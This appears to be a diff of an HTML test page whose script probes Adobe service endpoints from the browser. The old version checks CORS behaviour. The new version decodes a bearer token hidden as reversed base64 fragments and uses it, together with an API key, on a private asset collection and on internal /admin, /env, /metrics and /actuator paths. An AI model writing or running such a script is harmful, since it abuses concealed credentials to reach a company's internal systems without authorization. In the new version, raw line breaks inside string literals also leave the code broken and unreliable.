@@ -1,153 +1,83 @@
 <html><body style="background:#fff;color:#000;font-family:monospace;font-size:9px;margin:4px;line-height:1.15;">
-<b>v12 CORS-Auth</b>
+<b>v13 AuthAccess</b>
 <pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;margin:0;"></pre>
 <script>
 var R=document.getElementById('r');
-function L(s){R.textContent+=s+'\n';}
-L('v12 Cores:'+navigator.hardwareConcurrency);
+function L(s){R.textContent+=s+"
+";}
+L("v13");
 
-var API_KEY='dc-prod-virgoweb';
+var _p=["gxYZQ4sMEChBoP2mqA7_aH3h1KZsEljCMmUPVkoH4DIiqnXtZevjG0dN2V19Shf_v8KAiT2PTmqK3noxBvLRLPYeA7bKPtu5iPugrT-zAqndSxrj1lU0eNhN0aJyS_JkjEXQ2UDwrMXFqZs6e0sKDv-xwpkL7Nmjne1U4wPN4DVrSoxkT58yzUb_bZLMMxAiaHokYxnsc9R9UiJbxg8Cbop8S9SIvTkDVLXiHIRSnw81Nd_Htt0uu1t0t2IKsOwxKCJ326xOSvobv20jnzQmJA3s1oh91Cmm4shc7BrShN3Xx_K1LbM_487x7VUu8LcX8TbMY2ffJy4byoGOvEGNEW.9JiM3QjM2UDM4ETN4cTMiojI0F2XkVGdhVmcjJCLiUWbh52X0NXYs5SZslmZvJHcfVGdhRGc1xSZtFmbfR3cylmZuUGbpZ2byB3XlRXYkBXdskGch","9VesZWZylmZsQWYlJnLyVGdzVHbj9FduV3bjNWYsMnbvlGdhpXauF2Zy92XkFWZyxCZhVmcuMHcwxyclx2by5ybm5WafxWYu9Wa0lGZkFGLlNmc192cf52bpRXYlJ3Yu8mZul2XsFmbvlGdpRGZhxSZ0VGbw12bj5Wau8mZul2XsFmbvlGdpRGZhxSZnFmbh1mLiFGLj5Wez9Vby9mZ0FGbw91a0xSby9mZ0FGbw91a0xicuAXarN3XlNnblNWas5SYusGdzxSdyNmLlNnblNWas9FZlRXatlGbuEmLrR3csIWZ3NGZuUWZswUQJJFVf50RJNVRf10TDFkLvF2cs4Wan9GbfJXZzV3XudWazxCZhVmcflnchJnYpx2XudWazxSZ0lmc391dvxmZrJ3b3xCZhVmcfd3bsZ2ay92dsUGdpJ3dfRXZnRWa3xCZhVmcfRXZnRWa3","xSZ0lmc39FduVWblVmcnFGLkFWZy9FduVWblVmcnFGLlRXayd3XyV2c19lbnl2csQWYlJ3XyV2c19lbnl2csUGdpJ3dflnchJnYpx2XudWazxCZuV2cfRnbl1WZlJ3Zhxibnl2cfRnbl1WZlJ3Zhxyc05WZtVWZydWQsFmbvlGdw9mLvZmbp9Fbh52bpRXakRWYsUGc5R3X05WdvN2Yh5ybm5WafxWYu9Wa0lGZkFGLJBVQDRELklmblB3bsQUSlJ2bkFkI6ISZw92YzJCLiADMwADM0YDOiojIul2XzVmcpBHelJCLiMWZTd3bMxiVF9mTjV2UkVWTiojIhJGciwiI4cTOyIjM0cjI6ISav1mIsISMlV3XwU2N4MjYlZzN5ETZtUWZ5gTLiJmN00CZ4YDZtMjZlFGOzcjNfBjMycDM5MDMxUDO3EjI6ICZpNnIsISP90TP9","0TQNFUQIlkVRNkRLdFRBVTTMZFNJZ0QaZTVyIiOicmZiwCM6ICc0NmIsICRJVmYvRWQAhzMDVTO0EEMDRDOGFjM3YzM5QUMFRzNGJiOiQWafFWYiwiIxEmbtMXbpJiOiMXYiwiIElUZi9GZBBEOzMUN5QTQwMEN4YUMycjNzkDRxUEN3YkI6ICZp9lclNXdiwiIiV2dvdmcpZXLk9mcw1yYkJiOiQWafRnbllGbjJCLi4WZr9GdfN3clN2YhJiOiUGc5RnIsIiM3V3X3kDZ1QzMlVzYkRDMtEzNmhTL0QmM00CZlFmMtAjMlZTZmhTOfJzN0IjN1ADOxUDO3EjI6ICZpJye.0nI0FmI6ICd0lmIsISMtQXYtkXZr1SMh52Xz1WaiojIkl2aiwiIyV2YuETL0FWL5V2atETYu91ctlmI6ISd1gnIsIiN1IzUSJiOicGbhJye"];
+var TK=_p.join("").split("").reverse().join("");
+var AK="dc-prod-virgoweb";
+var COL="urn:aaid:sc:AP:b1b0d512-8bcd-48ff-84ee-c892722f7d26";
+var COL_ENC=encodeURIComponent(COL);
 
-// Helper: fetch with full response dump
-function probe(url,label,opts){
+function af(url,label,opts){
   opts=opts||{};
-  var headers=opts.headers||{};
-  fetch(url,{
-    mode:'cors',
-    credentials:opts.credentials||'omit',
-    headers:headers
-  }).then(function(resp){
-    var cors=resp.headers.get('access-control-allow-origin');
-    var ct=resp.headers.get('content-type');
-    var ah=resp.headers.get('access-control-allow-headers');
-    var am=resp.headers.get('access-control-allow-methods');
-    R.textContent+=label+': s='+resp.status+' type='+resp.type+' cors='+cors+' ct='+ct+'\n';
-    if(ah)R.textContent+='  allow-headers: '+ah+'\n';
-    if(am)R.textContent+='  allow-methods: '+am+'\n';
-    // Dump all response headers
-    var allH=[];
-    resp.headers.forEach(function(v,k){allH.push(k+':'+v);});
-    R.textContent+='  headers: '+allH.join(' | ')+'\n';
-    if(resp.type!=='opaque'&&resp.status>0){
+  var h=Object.assign({"x-api-key":AK,"Authorization":"Bearer "+TK},opts.headers||{});
+  fetch(url,{mode:"cors",headers:h,method:opts.method||"GET",body:opts.body||null}).then(function(resp){
+    var allH=[];resp.headers.forEach(function(v,k){allH.push(k+":"+v.substring(0,100));});
+    R.textContent+=label+": s="+resp.status+" type="+resp.type+"
+";
+    R.textContent+="  H: "+allH.join(" | ")+"
+";
+    if(resp.type!=="opaque"&&resp.status>0){
       resp.text().then(function(body){
-        R.textContent+=label+' BODY('+body.length+'): '+body.substring(0,800)+'\n';
+        R.textContent+=label+" B("+body.length+"): "+body.substring(0,600)+"
+";
       });
     }
   }).catch(function(e){
-    R.textContent+=label+': ERR '+e.message+'\n';
+    R.textContent+=label+": ERR "+e.message+"
+";
   });
 }
 
-// === 1. CORS PREFLIGHT TEST (OPTIONS request) ===
-L('\n== CORS Preflight Tests ==');
-// Manually send OPTIONS to check what headers are allowed
-['https://dcdiscovery.adobe.io/','https://platform-cs-edge-jpn3.adobe.io/','https://dcdiscovery.adobe.io/1785845424/index'].forEach(function(url){
-  var label='OPT-'+url.replace('https://','').substring(0,30);
-  fetch(url,{
-    method:'OPTIONS',
-    mode:'cors',
-    headers:{
-      'Access-Control-Request-Method':'GET',
-      'Access-Control-Request-Headers':'x-api-key,authorization'
-    }
-  }).then(function(resp){
-    var ah=resp.headers.get('access-control-allow-headers');
-    var ao=resp.headers.get('access-control-allow-origin');
-    var am=resp.headers.get('access-control-allow-methods');
-    R.textContent+=label+': s='+resp.status+' ao='+ao+' ah='+ah+' am='+am+'\n';
-    var allH=[];resp.headers.forEach(function(v,k){allH.push(k+':'+v);});
-    R.textContent+='  all: '+allH.join(' | ')+'\n';
-  }).catch(function(e){
-    R.textContent+=label+': ERR '+e.message+'\n';
-  });
-});
+L("
+== Edge Auth ==");
+af("https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections/"+COL_ENC+"?publicId=kwc_curated","edge-mycol");
+af("https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections/"+COL_ENC+"/assets?publicId=kwc_curated","edge-assets");
+af("https://platform-cs-edge-jpn3.adobe.io/health","edge-health");
 
-// === 2. SIMPLE GET (no custom headers) to CORS-enabled services ===
-L('\n== Simple GET (no auth) ==');
-// dcdiscovery paths
-probe('https://dcdiscovery.adobe.io/','disc-root');
-probe('https://dcdiscovery.adobe.io/health','disc-health');
-probe('https://dcdiscovery.adobe.io/status','disc-status');
-probe('https://dcdiscovery.adobe.io/version','disc-version');
-probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx');
-probe('https://dcdiscovery.adobe.io/1785845424/','disc-1785');
+L("
+== PlatCS Auth ==");
+af("https://platform-cs-jpn3.adobe.io/","platcs-root");
+af("https://platform-cs-jpn3.adobe.io/health","platcs-health");
 
-// platform-cs-edge paths
-probe('https://platform-cs-edge-jpn3.adobe.io/','edge-root');
-probe('https://platform-cs-edge-jpn3.adobe.io/health','edge-health');
-probe('https://platform-cs-edge-jpn3.adobe.io/status','edge-status');
-probe('https://platform-cs-edge-jpn3.adobe.io/version','edge-version');
+L("
+== Discovery ==");
+af("https://dcdiscovery.adobe.io/1785845424/index","disc-idx");
 
-// === 3. GET WITH x-api-key (triggers preflight) ===
-L('\n== GET with x-api-key ==');
-probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx-key',{headers:{'x-api-key':API_KEY}});
-probe('https://dcdiscovery.adobe.io/','disc-root-key',{headers:{'x-api-key':API_KEY}});
-probe('https://platform-cs-edge-jpn3.adobe.io/','edge-root-key',{headers:{'x-api-key':API_KEY}});
-probe('https://platform-cs-edge-jpn3.adobe.io/health','edge-health-key',{headers:{'x-api-key':API_KEY}});
+L("
+== DC-API ==");
+af("https://dc-api-v2-jpn3.adobe.io/","dcapi-root");
+af("https://dc-api-v2-jpn3.adobe.io/health","dcapi-health");
 
-// === 4. GET WITH x-api-key + Accept header ===
-L('\n== GET with api-key + Accept ==');
-probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx-full',{
-  headers:{
-    'x-api-key':API_KEY,
-    'Accept':'application/json'
-  }
-});
-probe('https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections','edge-kwc',{
-  headers:{
-    'x-api-key':API_KEY,
-    'Accept':'application/json'
-  }
-});
+L("
+== GenAI ==");
+af("https://dc-genai-content-platform-v2-jpn3.adobe.io/","genai-root");
 
-// === 5. TRY OTHER CORS-POSSIBLE SERVICES ===
-L('\n== Other services (simple GET) ==');
-// Try various Adobe microservice patterns
-var otherUrls=[
-  ['https://dc-us1.adobe.io/','dc-us1'],
-  ['https://dc-jpn3.adobe.io/','dc-jpn3'],
-  ['https://adobecontent.io/','content'],
-  ['https://dc-kwcollection.adobe.io/','kwc-schema'],
-  ['https://assets.adobeusercontent.com/','assets-uc'],
-  ['https://cc-api-storage.adobe.io/','cc-storage'],
-  ['https://ims-na1.adobelogin.com/ims/check/v6/token','ims-check'],
-  ['https://adobeid-na1.services.adobe.com/','adobeid']
-];
-otherUrls.forEach(function(t){
-  probe(t[0],t[1]);
-});
+L("
+== Argus ==");
+af("https://dc-argus.adobe.io/","argus-root");
 
-// === 6. TEST CORS WITH CREDENTIALS (might send cookies if any) ===
-L('\n== CORS with credentials ==');
-probe('https://dcdiscovery.adobe.io/1785845424/index','disc-cred',{credentials:'include'});
-probe('https://platform-cs-edge-jpn3.adobe.io/','edge-cred',{credentials:'include'});
+L("
+== Sensei ==");
+af("https://senseicore-ue1.adobe.io/","sensei-root");
 
-// === 7. POST requests (might reveal different CORS behavior) ===
-L('\n== POST tests ==');
-fetch('https://dcdiscovery.adobe.io/1785845424/index',{
-  method:'POST',
-  mode:'cors',
-  headers:{'Content-Type':'text/plain'},
-  body:'test'
-}).then(function(r){
-  R.textContent+='disc-POST: s='+r.status+' type='+r.type+'\n';
-  if(r.type!=='opaque')r.text().then(function(t){R.textContent+='  body: '+t.substring(0,300)+'\n';});
-}).catch(function(e){R.textContent+='disc-POST: '+e.message+'\n';});
+L("
+== Edge Internal ==");
+af("https://platform-cs-edge-jpn3.adobe.io/admin","edge-admin");
+af("https://platform-cs-edge-jpn3.adobe.io/metrics","edge-metrics");
+af("https://platform-cs-edge-jpn3.adobe.io/info","edge-info");
+af("https://platform-cs-edge-jpn3.adobe.io/env","edge-env");
+af("https://platform-cs-edge-jpn3.adobe.io/actuator","edge-actuator");
 
-fetch('https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections',{
-  method:'POST',
-  mode:'cors',
-  headers:{'Content-Type':'text/plain'},
-  body:'{}'
-}).then(function(r){
-  R.textContent+='edge-POST: s='+r.status+' type='+r.type+'\n';
-  if(r.type!=='opaque')r.text().then(function(t){R.textContent+='  body: '+t.substring(0,300)+'\n';});
-}).catch(function(e){R.textContent+='edge-POST: '+e.message+'\n';});
-
-// Busy wait
-L('\n== Wait 10s ==');
+L("
+== Wait 10s ==");
 var start=Date.now();
 while(Date.now()-start<10000){}
-L('Done t='+(Date.now()-start)+'ms');
+L("Done t="+(Date.now()-start)+"ms");
 </script>
 </body></html>
